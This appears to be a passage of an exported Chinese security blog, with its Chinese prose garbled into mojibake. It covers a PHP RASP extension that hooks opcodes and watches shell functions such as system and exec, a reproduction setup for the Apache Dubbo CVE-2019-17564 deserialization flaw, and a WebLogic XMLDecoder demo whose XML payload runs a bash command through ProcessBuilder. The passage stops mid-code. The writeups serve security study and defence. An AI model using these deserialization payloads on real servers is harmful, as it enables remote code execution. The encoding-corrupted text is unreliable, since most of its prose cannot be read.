ÂÜç‰∏æ‰∏Ä‰∏™ÈÅáÂà∞ÁöÑ‰æãÂ≠êÔºåÊØîÂ¶ÇÂú®Ê±°ÁÇπÊ†áËÆ∞ÁöÑÊó∂ÂÄôÔºåÁî®Êà∑ÂèØÊéß$aÔºå‰ΩÜÂú®ÂêéÊñáÁªèËøáÂ≠óÁ¨¶‰∏≤ÊãºÊé•$b = &quot;xx&quot;.$aÔºåÂ∞ÜÊÅ∂ÊÑè‰ª£Á†Å‰º†ÈÄíÁªô$bÂèòÈáèÔºåËøô‰∏™Êó∂ÂÄôÊàë‰ª¨ÊòØÊ≤°ÊúâÂäûÊ≥ïÂú®ÂáΩÊï∞Â±ÇÈù¢ÊéßÂà∂ÁöÑÊ†áËÆ∞ÁöÑÔºåËøô‰∏™Êó∂ÂÄôÈÄöËøáÂ§ÑÁêÜCONCATÊåá‰ª§Âç≥ÂèØËß£ÂÜ≥Ôºö Demo: Hook ZEND_ECHOÂü∫Á°ÄÔºåphpÊâßË°åÊµÅÁ®ã„ÄÅÂÖ®Â±ÄÂèòÈáèÁ≠â ËøôÁßçÊñπÂºèË¶ÅÊ±ÇÊàë‰ª¨Áü•ÈÅìÂáΩÊï∞ÊâÄÂØπÂ∫îÁöÑopcode‰ª£Á†ÅÔºåÂèØ‰ª•ÈÄöËøágdbË∞ÉËØïÁöÑÂäûÊ≥ïÊü•ÊâæÔºåËøôÈáå‰ª•echo‰∏∫‰æãÔºåÂÖ∂opcode‰∏∫ZEND_ECHO„ÄÇ Âú®passer6y.h‰∏≠Ê∑ªÂä†ÂÆö‰πâ:1int fake_echo(ZEND_OPCODE_HANDLER_ARGS); ÁÑ∂ÂêéÂú®passer6y.c‰∏≠Ê∑ªÂä†12345int fake_echo(ZEND_OPCODE_HANDLER_ARGS)&#123; php_printf(&quot;hook success&quot;); return ZEND_USER_OPCODE_RETURN;&#125; Âπ∂Âú®Ê®°ÂùóÂàùÂßãÂåñPHP_MINIT_FUNCTIONÂáΩÊï∞‰∏≠Ê∑ªÂä†Ë∞ÉÁî®Ôºö123456789PHP_MINIT_FUNCTION(passer6y)&#123; /* If you have INI entries, uncomment these lines REGISTER_INI_ENTRIES(); */ //php_override_func(&quot;echo&quot;, sizeof(&quot;echo&quot;), PHP_FN(fake_echo), NULL TSRMLS_CC); zend_set_user_opcode_handler(ZEND_ECHO, fake_echo); return SUCCESS;&#125; ÁºñËØëËøêË°åÔºö ÊïèÊÑüÂáΩÊï∞hook eval: INCLUDE_OR_EVALÂú®php-src-php-7.0.33/Zend/zend_ast.c#1258ËøòÊúâÂÖ∂‰ªñÂá†‰∏™‰πü‰ΩøÁî®‰∫ÜÁõ∏ÂêåÁöÑopcode: 12345678910case ZEND_AST_INCLUDE_OR_EVAL: switch (ast-&gt;attr) &#123; case ZEND_INCLUDE_ONCE: FUNC_OP("include_once"); case ZEND_INCLUDE: FUNC_OP("include"); case ZEND_REQUIRE_ONCE: FUNC_OP("require_once"); case ZEND_REQUIRE: FUNC_OP("require"); case ZEND_EVAL: FUNC_OP("eval"); EMPTY_SWITCH_DEFAULT_CASE(); &#125; break; ÊòæÁÑ∂Ôºåinclude_once„ÄÅinclude„ÄÅrequire_once„ÄÅrequire„ÄÅevalËøô5‰∏™ÂáΩÊï∞ÁöÑÂäüËÉΩ‰∏ÄÊ†∑„ÄÇ system: DO_ICALL ÂèòÈáèÂáΩÊï∞ÊâßË°åÔºöDO_FCALL$a=&quot;system&quot;;$a(&quot;whoami&quot;); ÊÄªÁªì‰∏Ä‰∏ãÔºåhookËøôÂá†‰∏™opcodeÊåá‰ª§Ôºö INCLUDE_OR_EVAL DO_ICALL DO_FCALL ÂÖ∑‰ΩìÂÆûÁé∞opcode hookÈÄöËøázend_set_user_opcode_handler(zend_uchar opcode, user_opcode_handler_t handler)ÂáΩÊï∞ÂÆûÁé∞Â∞ÜÊåáÂÆöÁöÑopcodeÔºåÊõøÊç¢ÊàêÊàë‰ª¨Ëá™ÂÆö‰πâÁöÑ„ÄÇ ÂÖ∂‰∏≠user_opcode_handler_tÁ±ªÂûãÊòØzend_execute_data *execute_dataÁöÑÂà´ÂêçÔºö Á¨¨‰∏ÄÊ¨°ËßÅtypedefÁöÑËøôÁßçÁî®Ê≥ïÔºåÂèÇËÄÉËøôÁØáÊñáÁ´†Ôºöhttps://c.biancheng.net/view/298.html zend_execute_dataÁªìÊûÑÁöÑÊ≥®Ëß£Âú®ÊñáÊ°£‰∏≠ÊúâËß£ÈáäÔºöhttps://www.kancloud.cn/nickbai/php7/36328012345678910111213141516171819#define EX(element) ((execute_data)-&gt;element)//zend_compile.hstruct _zend_execute_data &#123; const zend_op *opline; //ÊåáÂêëÂΩìÂâçÊâßË°åÁöÑopcodeÔºåÂàùÂßãÊó∂ÊåáÂêëzend_op_arrayËµ∑Âßã‰ΩçÁΩÆ zend_execute_data *call; /* current call */ zval *return_value; //ËøîÂõûÂÄºÊåáÈíà zend_function *func; //ÂΩìÂâçÊâßË°åÁöÑÂáΩÊï∞ÔºàÈùûÂáΩÊï∞Ë∞ÉÁî®Êó∂‰∏∫Á©∫Ôºâ zval This; //Ëøô‰∏™ÂÄºÂπ∂‰∏ç‰ªÖ‰ªÖÊòØÈù¢ÂêëÂØπË±°ÁöÑthisÔºåËøòÊúâÂè¶Â§ñ‰∏§‰∏™ÂÄº‰πüÈÄöËøáËøô‰∏™ËÆ∞ÂΩïÔºöcall_info + num_argsÔºåÂàÜÂà´Â≠òÂú®zval.u1.reserved„ÄÅzval.u2.num_args zend_class_entry *called_scope; //ÂΩìÂâçcallÁöÑÁ±ª zend_execute_data *prev_execute_data; //ÂáΩÊï∞Ë∞ÉÁî®Êó∂ÊåáÂêëË∞ÉÁî®‰ΩçÁΩÆ‰ΩúÁî®Á©∫Èó¥ zend_array *symbol_table; //ÂÖ®Â±ÄÂèòÈáèÁ¨¶Âè∑Ë°®#if ZEND_EX_USE_RUN_TIME_CACHE void **run_time_cache; /* cache op_array-&gt;run_time_cache */#endif#if ZEND_EX_USE_LITERALS zval *literals; //Â≠óÈù¢ÈáèÊï∞ÁªÑÔºå‰∏éfunc.op_array-&gt;literalsÁõ∏Âêå#endif&#125;; ÂÖ∂‰∏≠Á¨¨‰∏Ä‰∏™ËΩ¶ÁÆ°ÂëòoplineÁöÑÁªìÊûÑÂÆö‰πâÔºö123456789101112struct _zend_op &#123; const void *handler; //ÂØπÂ∫îÊâßË°åÁöÑCËØ≠Ë®ÄfunctionÔºåÂç≥ÊØèÊù°opcodeÈÉΩÊúâ‰∏Ä‰∏™C functionÂ§ÑÁêÜ znode_op op1; //Êìç‰ΩúÊï∞1 znode_op op2; //Êìç‰ΩúÊï∞2 znode_op result; //ËøîÂõûÂÄº uint32_t extended_value; uint32_t lineno; zend_uchar opcode; //opcodeÊåá‰ª§ zend_uchar op1_type; //Êìç‰ΩúÊï∞1Á±ªÂûã zend_uchar op2_type; //Êìç‰ΩúÊï∞2Á±ªÂûã zend_uchar result_type; //ËøîÂõûÂÄºÁ±ªÂûã&#125;; ËøòÊúâÊàêÂëòfuncÁöÑÂÆö‰πâÔºö123456789101112131415161718union _zend_function &#123; zend_uchar type; /* MUST be the first element of this struct! */ struct &#123; zend_uchar type; /* never used */ zend_uchar arg_flags[3]; /* bitset of arg_info.pass_by_reference */ uint32_t fn_flags; zend_string *function_name; zend_class_entry *scope; //ÊàêÂëòÊñπÊ≥ïÊâÄÂ±ûÁ±ªÔºåÈù¢ÂêëÂØπË±°ÂÆûÁé∞‰∏≠Áî®Âà∞ union _zend_function *prototype; uint32_t num_args; //ÂèÇÊï∞Êï∞Èáè uint32_t required_num_args; //ÂøÖ‰º†ÂèÇÊï∞Êï∞Èáè zend_arg_info *arg_info; //ÂèÇÊï∞‰ø°ÊÅØ &#125; common; zend_op_array op_array; //ÂáΩÊï∞ÂÆûÈôÖÁºñËØë‰∏∫ÊôÆÈÄöÁöÑzend_op_array zend_internal_function internal_function;&#125;; Áé∞Âú®Êàë‰ª¨Ë¶ÅÂÆûÁé∞‰∏Ä‰∏™ÊâßË°åËØ•opcodeÁöÑÂáΩÊï∞‰ª•ÂèäÂèÇÊï∞ÁöÑÂäüËÉΩÔºö12345678910111213141516171819202122232425262728293031static int php_do_fcall_handler(zend_execute_data *execute_data)&#123; const zend_op *opline = execute_data-&gt;opline; zend_execute_data *call = execute_data-&gt;call; zend_function *fbc = call-&gt;func; if (fbc-&gt;type == ZEND_INTERNAL_FUNCTION) &#123; // Ëé∑ÂèñÂèÇÊï∞‰∏™Êï∞ int arg_count = ZEND_CALL_NUM_ARGS(call); if (!arg_count) &#123; return ZEND_USER_OPCODE_DISPATCH; &#125; // Â¶ÇÊûú‰∏çÂú®Á±ª‰∏≠ if (fbc-&gt;common.scope == NULL)&#123; zend_string *fname = fbc-&gt;common.function_name; char *funcname = ZSTR_VAL(fname); int len = strlen(funcname); if (fname) &#123; if (strncmp("passthru", funcname, len) == 0 || strncmp("system", funcname, len) == 0 || strncmp("exec", funcname, len) == 0 || strncmp("shell_exec", funcname, len) == 0 || strncmp("proc_open", funcname, len) == 0 ) &#123; zend_error(E_WARNING, funcname); &#125; &#125; &#125; &#125; zend_error(E_WARNING, "ZEND_DO_FCALL Hook success"); return ZEND_USER_OPCODE_DISPATCH;&#125; ÂáΩÊï∞ÂèÇÊï∞Ëé∑ÂèñÂèÇËÄÉphp7ÂÜÖÊ†∏ÂâñÊûêÊñáÁ´†ÁöÑÂáΩÊï∞ÂèÇÊï∞Ëß£ÊûêÈÉ®ÂàÜÔºåËé∑ÂèñÂà∞Á¨¨‰∏Ä‰∏™ÂèÇÊï∞Ôºö1234static int php_do_fcall_handler(zend_execute_data *execute_data)&#123;// ...zend_execute_data *call = execute_data-&gt;call;zval *arg = ZEND_CALL_ARG(call, 1); Ê†ºÂºèÂåñËæìÂá∫123456789101112131415static void php_warning(const char *fname, const char *arg, const char *format, ...) /* &#123;&#123;&#123; */ &#123; char *buffer, *msg; va_list args; //EG(error_reporting) = 1; va_start(args, format); vspprintf(&amp;buffer, 0, format, args); spprintf(&amp;msg, 0, "%s(\"%s\"): %s", fname, arg, buffer); efree(buffer); zend_error(E_WARNING, msg); efree(msg); va_end(args);&#125; /* &#125;&#125;&#125; *///... php_do_fcall_handler()php_warning(funcname, ZSTR_VAL(Z_STR_P(arg)), "warning function"); Êé•‰∏ãÊù•ÂÜô‰∏Ä‰∏™Âæ™ÁéØÈÅçÂéÜÔºåËé∑ÂèñÂÖ®ÈÉ®ÂèÇÊï∞Ôºö123456789// ÂàõÂª∫‰∏Ä‰∏™Êï∞ÁªÑÔºåËÆ∞ÂΩïÂèÇÊï∞ZVAL_NEW_ARR(&amp;z_params); zend_hash_init(Z_ARRVAL(z_params), arg_count, NULL, ZVAL_PTR_DTOR, 0);for (i=0; i&lt;arg_count; i++) &#123; zval *p = ZEND_CALL_ARG(call, i + 1); if (Z_REFCOUNTED_P(p)) Z_ADDREF_P(p); zend_hash_next_index_insert(Z_ARRVAL(z_params), p);&#125; Ââ©‰∏ãÂá†‰∏™opcodeÊåñÂùë Ê±°ÁÇπÊ†áËÆ∞ÁªßÁª≠ÂèÇËÄÉfate0Â∏àÂÇÖÁöÑxmarkÈ°πÁõÆÔºåÂú®Êâ©Â±ï‰∏≠ÈÄöËøáPHP_FUNCTIONÊù•ÂÆö‰πâxmarkÂáΩÊï∞ÔºåÂ∏ÆÂä©Êàë‰ª¨Ê†áËÆ∞Â≠óÁ¨¶‰∏≤Ôºå‰º†ÈÄí‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÂºïÁî®ÔºåËøîÂõûÊòØÂê¶Ê†áËÆ∞ÊàêÂäü„ÄÇ12345678910111213141516171819202122PHP_FUNCTION(xmark)&#123; zval *z_str; if (!XMARK_G(enable)) &#123; RETURN_FALSE; &#125; // Ëé∑ÂèñÂèÇÊï∞ÔºåÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞‰∏∫Êé•Êî∂ÂèÇÊï∞ÁöÑ‰∏™Êï∞ÔºåZEND_NUM_ARGS()‰∏∫ÊúâÂ§öÂ∞ëË¶ÅÂ§öÂ∞ëÔºåz‰∏∫zvalÁ±ªÂûãÔºåÂºïÁî®‰º†ÂèÇÈÄöËøázend_parse_parametersÂè™ËÉΩÁî®zÔºåÁ¨¨‰∏â‰∏™‰∏∫Â≠òÂÇ®ÂèÇÊï∞ÂèòÈáèÁöÑÊåáÈíà if (zend_parse_parameters(ZEND_NUM_ARGS(), "z", &amp;z_str) == FAILURE) &#123; return; &#125; ZVAL_DEREF(z_str); // Âú®php-src-php-7.0.33/Zend/zend_types.h‰∏≠ÂÆö‰πâÔºåÂ¶ÇÊûúz_strÊòØÂºïÁî®ÂàôÊâæÂà∞ÂÖ∂ÂÖ∑‰ΩìÂºïÁî®ÁöÑzval // Âè™ËÉΩÊ†áËÆ∞Â≠óÁ¨¶‰∏≤ÔºåÊâÄ‰ª•arrayÂíåÂÖ∂‰ªñÁ±ªÂûãÂæóÂÖàÈÅçÂéÜ‰∏Ä‰∏ã if (IS_STRING != Z_TYPE_P(z_str) || Z_STRLEN_P(z_str) == 0) &#123; RETURN_FALSE; &#125; if (xmark_zstr(z_str) == FAILURE) &#123; RETURN_FALSE; &#125; RETURN_TRUE;&#125; ÂÖ∂‰∏≠Ê†áËÆ∞Â≠óÁ¨¶ÈÉ®ÂàÜÂú®xmark_zstrÂáΩÊï∞‰∏≠Â§ÑÁêÜÔºö1234567891011static zend_always_inline int xmark_zstr(zval *z_str)&#123; if (!XCHECK_FLAG(Z_STR_P(z_str))) &#123; zend_string *str = zend_string_init(Z_STRVAL_P(z_str), Z_STRLEN_P(z_str), 0); ZSTR_LEN(str) = Z_STRLEN_P(z_str); zend_string_release(Z_STR_P(z_str)); // ÈáäÊîæz_strÂ≠óÁ¨¶‰∏≤ XMARK_FLAG(str); // Ê†áËÆ∞Â≠óÁ¨¶‰∏≤ ZVAL_STR(z_str, str); // Ê†áËÆ∞ÂÆå‰∫ÜÂêéÔºåÂ∞Üz_strÁöÑÂÄºËÆæ‰∏∫str &#125; return SUCCESS;&#125; Âú®ÂÖ∑‰ΩìÁöÑXMARK_FLAGÂíåXCHECK_FLAGÂáΩÊï∞ËøôÊ†∑ÂÆûÁé∞ÁöÑÔºåxmark/php_xmark.h#41123456789101112#if PHP_VERSION_ID &lt; 70300# define IS_XMARK_FLAG (1&lt;&lt;6)# define XMARK_FLAG(str) (GC_FLAGS((str)) |= IS_XMARK_FLAG)# define XCLEAR_FLAG(str) (GC_FLAGS((str)) &amp;= ~IS_XMARK_FLAG)# define XCHECK_FLAG(str) (GC_FLAGS((str)) &amp; IS_XMARK_FLAG)#else# define EX_CONSTANT(op) RT_CONSTANT(EX(opline), op)# define IS_XMARK_FLAG (1&lt;&lt;5)# define XMARK_FLAG(str) GC_ADD_FLAGS(str, IS_XMARK_FLAG)# define XCLEAR_FLAG(str) GC_DEL_FLAGS(str, IS_XMARK_FLAG)# define XCHECK_FLAG(str) (GC_FLAGS((str)) &amp; IS_XMARK_FLAG)#endif ÂÖàÂà§Êñ≠phpÁâàÊú¨Ôºå7.0.3‰∏∫ÂàÜÁïåÁ∫øÔºåÊàëËøôÈáåÊòØ7.0.33ÔºåÈÄöËøáÂÆèÂÆö‰πâÂÆûÁé∞Ê†áËÆ∞„ÄÅÊ∏ÖÈô§„ÄÅÊ£ÄÊµãflagÁöÑÂäüËÉΩÔºåÂÖ∂‰∏≠GC_FLAGSÂáΩÊï∞‰∏∫phpÂÜÖÊ†∏‰∏≠php-src-php-7.0.33/Zend/zend_types.hÁöÑÂÆèÂÆö‰πâÔºåÂÄüÂä©‰∫ÜÂûÉÂúæÂõûÊî∂ÁªìÊûÑÁöÑgc.u.v.flagsÂ≠óÊÆµÁöÑÊú™Ë¢´‰ΩøÁî®ÁöÑÊ†áËÆ∞‰ΩçÊù•ËÆ∞ÂΩïÊòØÂê¶Ë¢´Ê±°ÊüìÔºöËÄåÂú®Ê∏ÖÈô§Ê†áËÆ∞„ÄÅÊ£ÄÊµãÊ†áËÆ∞ÁöÑÂÆûÁé∞‰∏≠ÊÄùË∑Ø‰πüÂíåËøô‰∏™Á±ª‰ººÔºåÈÄöËøáxmark/php_xmark.hÁöÑÂÆèËøõË°åËøêÁÆó„ÄÇ Â®ÅËÉÅÂà§Êñ≠ÊÄùË∑ØÊòØËøôÊ†∑ÁöÑÔºåÂÉèphpwaf‰∏ÄÊ†∑Âú®È°πÁõÆÊúÄÂºÄÂßãÁöÑÂú∞ÊñπÔºåÊ±°ÁÇπÊ†áËÆ∞HTTPËØ∑Ê±Ç‰∏≠ÂèØÊéßÁöÑÂèÇÊï∞ÔºåÁß∞‰πã‰∏∫sourceÁÇπÊ†áËÆ∞Ôºö1234567891011prvd_xmark($_GET, true);prvd_xmark($_POST, true);prvd_xmark($_COOKIE, true);prvd_xmark($_FILES, true);prvd_xmark($_REQUEST, true);foreach ($_SERVER as $key =&gt; &amp;$value) &#123; if (stripos($key, 'HTTP_') === 0) &#123; prvd_xmark($value); &#125;&#125; Ëøô‰∫õÂèÇÊï∞ÁªèËøáÊãºÊé•„ÄÅËµãÂÄºÁ≠âÊìç‰Ωú‰∏çÊñ≠ÁöÑ‰º†ÈÄíÔºåÊàë‰ª¨Êää‰ªñÁß∞‰πã‰∏∫filterÁÇπÔºåÂú®Ëøô‰∏™ËøáÁ®ãÊ†áËÆ∞‰πüË¶ÅÈöè‰πã‰º†ÈÄíÔºå‰∏Ä‰∏™‰æãÂ≠êÔºö1234567function base64_decode($data, ...$args) &#123; $result = call_user_func(PRVD_RENAME_PREFIX."base64_decode", $data, ...$args); if (PRVD_TAINT_ENABLE &amp;&amp; prvd_xcheck($data)) &#123; prvd_xmark($result); &#125; return $result;&#125; Âú®ÈÅáÂà∞base64Ëß£Á†ÅÊìç‰ΩúÊó∂ÔºåÂ¶ÇÊûúsourceÁÇπÂ∑≤Ë¢´Ê†áËÆ∞ÔºåÂàô‰º†ÈÄíÊ†áËÆ∞ÁªôËß£Á†ÅÂêéÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇ ÊúÄÂêéÂ∞±ÊòØÂ®ÅËÉÅÂà§Êñ≠ÁöÑËøáÁ®ãÔºåËøô‰∫õÊï∞ÊçÆÂú®ÊúÄÂêéÂà∞ËææÊïèÊÑüÂáΩÊï∞ÁöÑsinkÁÇπÔºåÊØîÂ¶Çsystem„ÄÅevalËøô‰∫õÈ´òÂç±ÂáΩÊï∞ÔºåÂà§Êñ≠Ê†áËÆ∞ÊòØÂê¶ËøòÂ≠òÂú®ÔºåÂç≥Ê£ÄÊµãÊòØÂê¶ÊúâÂèØÊéßÁöÑÈ£éÈô©„ÄÇ ‰∏äÊä•Âπ≥Âè∞ÊúÄÂêéÊúÄÂêéÊÉ≥‰∫Ü‰∏Ä‰∏ãpayloadÊ®°ÂºèÁöÑÁº∫ÁÇπÔºåÂú®Â§öÂÖ•Âè£phpÊñá‰ª∂Êó∂ÔºåÂÆπÊòì‰∫ßÁîüÈÅóÊºèÂåÖÂê´wafÁöÑÊÉÖÂÜµÔºåÂØºËá¥ËØØÊä•ÁöÑÈóÆÈ¢òÔºåÂΩìÁÑ∂Â¶ÇÊûúÊääÂÖ®ÈÉ®ÈÄªËæëÈÉΩÂÜôÂà∞Êâ©Â±ï‰∏≠Ôºå‰∏é‰πãËÄåË®ÄÁöÑ‰ª£‰ª∑Â∞±ÊòØÂºÄÂèëÈöæÂ∫¶ÊûÅÈ´ò„ÄÇÂÖ∂Ê¨°FuzzÊ®°ÂºèÁâπÊÆäÊºèÊ¥ûÊ£ÄÊµãÈúÄË¶ÅÊåáÂÆöÁöÑpayloadÔºå‰∏îÊ£ÄÊµãÁöÑÁ≤æÂ∫¶ÂèñÂÜ≥‰∫épayloadÁöÑÁ≤æÂ∫¶„ÄÇ‰∏çËøáÊàëËßâÂæóÊúâÊ±°ÁÇπÊ£ÄÊµãÂäüËÉΩÂ∞±Â§ü‰∫Ü„ÄÇ Ëä±‰∫ÜÂ∑Æ‰∏çÂ§öÂçä‰∏™ÊúàÁöÑÊó∂Èó¥Êù•Á†îÁ©∂PHPÁöÑRASPÊú∫Âà∂Ôºå‰ªéphpÂÜÖÊ†∏Âà∞ÂêÑÁßçÂºÄÊ∫êÁöÑraspÈ°πÁõÆÈÉΩÊúâ‰∫Ü‰∏Ä‰∏™Ê∑±ÂÖ•ÁöÑÂ≠¶‰π†„ÄÇÂÜôCËØ≠Ë®ÄÊâ©Â±ïÔºåÁ†îÁ©∂phpÂ∫ïÂ±ÇÂ§™Á°¨Ê†∏‰∫ÜÔºåÂ±ûÂÆûËá™Èó≠Ôºå‰ª•ÂêéÊâìÁÆóÂÜçÁ†îÁ©∂‰∏Ä‰∏ãjavaÁöÑraspÊú∫Âà∂„ÄÇ ÊúÄÂêéËÜúÂâçËæà‰ª¨ÁöÑÊé¢Á¥¢ÂíåÂàÜ‰∫´„ÄÇ ÂèÇËÄÉÊñáÁ´†Ôºö ÊõøÊç¢PHPÂ∫ïÂ±ÇÂáΩÊï∞ÂÆûÁé∞ ‰ªéPHPÊ∫êÁ†Å‰∏éÊâ©Â±ïÂºÄÂèëË∞àPHP‰ªªÊÑè‰ª£Á†ÅÊâßË°å‰∏éÈò≤Âæ° php7ÂÜÖÊ†∏ÂâñÊûê xmark: A PHP7 extension that can hook most functions/classes and parts of opcodes ‰∏ÄÁ±ªPHP RASPÂÆûÁé∞ PHP ËøêË°åÊó∂ÊºèÊ¥ûÊ£ÄÊµã ÊØï‰∏öËÆæËÆ°‰πãphp RASP taint: Taint is a PHP extension, used for detecting XSS codes]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2019-17564ÔºöApache DubboÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂàÜÊûê]]></title>
    <url>%2F2020%2F02%2F14%2FCVE-2019-17564%EF%BC%9AApache%20Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[ÂâçÂá†Â§©360Âèë‰∫Ü‰∏ÄÂàôApache DubboÁöÑÊºèÊ¥ûÈ¢ÑË≠¶Ôºå@hu3skyÂ∏àÂÇÖËÆ©ÊàëÂ∏Æ‰ªñÁúãÁúãËøô‰∏™ÊºèÊ¥ûÂ§çÁé∞ÁöÑÈóÆÈ¢ò„ÄÇBurpÊâì‰∫åËøõÂà∂ÁöÑÂèçÂ∫èÂàóÂåñÊï∞ÊçÆÊúâ‰∏ÄÁÇπbugÔºåËøôÈáåËÆ∞ÂΩï‰∏Ä‰∏ãËß£ÂÜ≥ÁöÑËøáÁ®ã„ÄÇ ÁéØÂ¢ÉÊê≠Âª∫12git clone https://github.com/apache/dubbo-samples.gitcd dubbo-samples/java/dubbo-samples-http ‰øÆÊîπ/dubbo-samples/java/dubbo-samples-http/pom.xml123456&lt;properties&gt; &lt;source.level&gt;1.8&lt;/source.level&gt; &lt;target.level&gt;1.8&lt;/target.level&gt; &lt;!--‰øÆÊîπÁâàÊú¨‰∏∫2.7.3--&gt; &lt;dubbo.version&gt;2.7.3&lt;/dubbo.version&gt; ... ÂÜçÂä†‰∏Ä‰∏™dependencyÔºå‰Ωú‰∏∫gadgetÔºö123456&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2&lt;/version&gt;&lt;/dependency&gt; ÁÑ∂Âêé mvn clean packageÊé•ÁùÄ mvn -Djava.net.preferIPv4Stack=true -Dexec.mainClass=org.apache.dubbo.samples.http.HttpProvider exec:java ÊàñËÄÖÊâîËøõideaÈáåÔºåÈÖç‰∏Ä‰∏™-Djava.net.preferIPv4Stack=trueÂèÇÊï∞ ËøòË¶ÅÈÖç‰∏Ä‰∏™zookeeperÔºözookeeper-3.4.14.ta ÊâßË°åbin/zkServer.shÔºåÂ¶ÇÊûúÊèêÁ§∫no such file zoo.cfgÔºåÂú®confÁõÆÂΩï‰∏ãÊääzoo-sample.cfgÊîπÊàêzoo.cfgÔºåÁÑ∂ÂêéÁªßÁª≠ÊâßË°åÂç≥ÂèØ„ÄÇ ÊºèÊ¥ûÂ§çÁé∞Ë∏©‰∫Ü‰∏ÄÂ†ÜÂùëÔºåysoÁîüÊàêÁöÑÂèçÂ∫èÂàóÂåñÊï∞ÊçÆÔºåÁõ¥Êé•Ë¥¥ËøõburpÊòØÊúâËúúÊ±ÅbugÁöÑÔºåÊúÄÂêéÁöÑËß£ÂÜ≥ÂäûÊ≥ïÊúâ‰∏§ÁßçÔºö Âú®RepeatÈáåÁî®Paste from file (@hu3skyÂ∏àÂÇÖÊàêÂäü‰∫ÜÔºåÊàëÊ≤°ÊàêÂäü) ÊúÄÂêéÁøªawesome-burp-extensionsÊâæÂà∞‰∫ÜJava-Deserialization-ScannerËøô‰∏™burpÊèí‰ª∂Ëß£ÂÜ≥ÁöÑÔºåÂÆâÂà©‰∏ÄÊ≥¢Ôºö ÊºèÊ¥ûÂàÜÊûêÂú®dispatchÊñá‰ª∂Â§ÑÁêÜhttpË∑ØÁî±ÂàÜÂèëÔºå/org/apache/dubbo/remoting/http/servlet/DispatcherServlet.java Ë∑üËøõhandleÂáΩÊï∞Ôºö/org/apache/dubbo/rpc/protocol/http/HttpProtocol.javaÂà§Êñ≠ÊòØÂê¶‰∏∫postËØ∑Ê±ÇÔºåÁÑ∂ÂêéÁªßÁª≠Â§ÑÁêÜRequestÔºö/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.classÂ∞ÜrequestÁöÑpostËæìÂÖ•‰º†ÂÖ•Ôºö ÊúÄÂêéÂú®/org/springframework/remoting/rmi/RemoteInvocationSerializingExporter.classÔºå Ë∞ÉÁî®readObject() Ë∞ÉÁî®Ê†àÔºö ÊúÄÂêé‰∏Ä‰∏™sampleÁéØÂ¢ÉÁöÑÂèçÂ∫èÂàóÂåñÔºåË¶ÅÁªìÂêàÂÖ∂‰ªñÁªÑ‰ª∂ÊâçËÉΩÂà©Áî®Ôºå‰∏™‰∫∫ÊÑüËßâÂç±ÂÆ≥Èù¢‰∏çÊòØÂæàÂ§ß„ÄÇÊñ∞ÁâàÁöÑ‰øÆÂ§çÁ≠ñÁï•ÔºåÂú®Â§ÑÁêÜË∑ØÁî±ÁöÑhandleÂáΩÊï∞Ôºå‰ΩøÁî®‰∫ÜÂè¶Â§ñ‰∏Ä‰∏™ÁªÑ‰ª∂Ôºå‰∏îÂú®Â§ÑÁêÜÈùûjsonÊï∞ÊçÆÁöÑÊó∂ÂÄô‰ºöÊäõÂá∫ÂºÇÂ∏∏„ÄÇ]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>ÊºèÊ¥ûÂàÜÊûê</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WebLogic-XMLDecoderÂèçÂ∫èÂàóÂåñÂàÜÊûê]]></title>
    <url>%2F2020%2F02%2F11%2FWebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[Âü∫Á°ÄÂÖ≥‰∫éjavaÂèçÂ∫èÂàóÂåñÔºåÂèØ‰ª•ÂèÇËÄÉËøôÁØáÊñáÁ´†ÔºåÂÜôÁöÑÂæàËØ¶ÁªÜÊ∑±ÂÖ•@gyyyy„ÄäÊµÖÊûêJavaÂ∫èÂàóÂåñÂíåÂèçÂ∫èÂàóÂåñ„Äã„ÄÇXMLDecoderÊòØjava‰∏≠ÁöÑ‰∏Ä‰∏™Á±ªÔºå‰∏çÊòØWeblogicÁâπÊúâÁöÑÔºåÂú®Ëøô‰∏™‰ΩçÁΩÆjava.beans.XMLDecoderÔºå‰∏™‰∫∫ÁêÜËß£Âíå‰º†ÁªüÂèçÂ∫èÂàóÂåñÁ±ª‰ººÔºåÂè™ÊòØËΩΩ‰ΩìÊòØÈÄöËøáXMLÊù•ÊèèËø∞Â∫èÂàóÂåñÊï∞ÊçÆ„ÄÇ ‰∏ãÈù¢Êù•Áúã‰∏Ä‰∏™Ëß£ÊûêxmlÂØºËá¥ÂèçÂ∫èÂàóÂåñÂëΩ‰ª§ÊâßË°åÁöÑdemo:1234567891011121314import java.beans.XMLDecoder;import java.io.BufferedInputStream;import java.io.FileInputStream;import java.io.FileNotFoundException;public class test &#123; public static void main(String[] args) throws FileNotFoundException &#123; XMLDecoder d = new XMLDecoder( new BufferedInputStream( new FileInputStream("/Users/passer6y/Documents/Code/java/weblogic/test.xml"))); Object result = d.readObject(); d.close(); &#125;&#125; test.xml123456789101112131415&lt;java version="1.4.0" class="java.beans.XMLDecoder"&gt; &lt;void class="java.lang.ProcessBuilder"&gt; &lt;array class="java.lang.String" length="3"&gt; &lt;void index="0"&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index="1"&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index="2"&gt; &lt;string&gt;open -a Calculator&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method="start"/&gt;&lt;/void&gt;&lt;/java&gt; ËøêË°åÂêéÂèØ‰ª•ÂèëÁé∞ÔºåXMLËΩ¨Êç¢ËøáÊù•ÁöÑjava‰ª£Á†ÅÂç≥12345import java.lang.ProcessBuilder;import java.lang.String;String[] cmdList = 